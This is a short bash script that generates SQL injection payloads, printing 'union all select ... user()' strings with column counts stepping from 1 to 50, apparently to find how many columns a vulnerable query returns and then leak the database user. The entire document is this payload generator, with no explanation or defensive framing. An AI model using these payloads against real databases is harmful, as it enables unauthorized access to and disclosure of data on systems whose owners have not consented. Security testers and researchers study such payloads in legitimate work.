#!/bin/bash

echo '-1 union all select user() ; #'

echo '-1 union all select 1, user() ; #'

str='-1 union all select  user() ; #'

j="1,"

for i in `seq 2 50`
do 

j="$j $i,"

echo "-1 union all select $j user() ; #"

done
